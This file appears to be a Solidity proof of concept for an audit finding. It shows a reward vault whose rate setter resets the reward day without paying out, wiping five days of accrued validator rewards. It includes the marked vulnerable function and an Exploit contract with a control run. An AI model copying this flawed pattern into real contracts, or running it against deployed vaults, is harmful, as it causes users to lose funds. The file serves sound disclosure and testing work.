// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// veTenet RewardVault.setDailyRewardRate writes lastReward = today without distributing.
/// Five days at 100 tokens/day (500) are no longer claimable. The control distributes first.

contract RewardToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract RewardVault {
    RewardToken public token;
    address public validator;
    uint256 public dailyRewardRate;
    uint256 public lastReward;
    uint256 public paid;

    constructor(RewardToken t, address v) {
        token = t;
        validator = v;
        uint256 day = block.timestamp / 1 days;
        require(day >= 5, "day");
        lastReward = day - 5;
        dailyRewardRate = 100 ether;
    }

    function pending() public view returns (uint256) {
        uint256 day = block.timestamp / 1 days;
        if (day <= lastReward) return 0;
        return (day - lastReward) * dailyRewardRate;
    }

    function setDailyRewardRate(uint256 newRate) external {
        dailyRewardRate = newRate;
        // @> VULN: lastReward is moved to the current day, so already-accrued days drop out of pending()
        lastReward = block.timestamp / 1 days;
    }

    function distributeRewards() external {
        uint256 reward = pending();
        lastReward = block.timestamp / 1 days;
        paid += reward;
        if (reward > 0) token.transfer(validator, reward);
    }
}

contract Exploit {
    address public constant VALIDATOR = 0x2222222222222222222222222222222222222222;
    RewardToken public token;
    RewardVault public vault;
    uint256 public accruedBefore;
    uint256 public accruedAfter;
    uint256 public validatorBal;

    constructor() {
        token = new RewardToken();
        vault = new RewardVault(token, VALIDATOR);
        token.mint(address(vault), 500 ether);
    }

    function run() external {
        accruedBefore = vault.pending();
        vault.setDailyRewardRate(200 ether);
        accruedAfter = vault.pending();
        vault.distributeRewards();
        validatorBal = token.balanceOf(VALIDATOR);
        require(accruedBefore == 500 ether, "accrued");
        require(accruedAfter == 0, "wiped");
        require(vault.paid() == 0, "paid");
        require(validatorBal == 0, "validator");
        require(token.balanceOf(address(vault)) == 500 ether, "stuck");
    }

    function runControl() external {
        uint256 due = vault.pending();
        vault.distributeRewards();
        vault.setDailyRewardRate(200 ether);
        require(due == 500 ether, "due");
        require(token.balanceOf(VALIDATOR) == 500 ether, "received");
        require(vault.pending() == 0, "nothing left to wipe");
    }
}
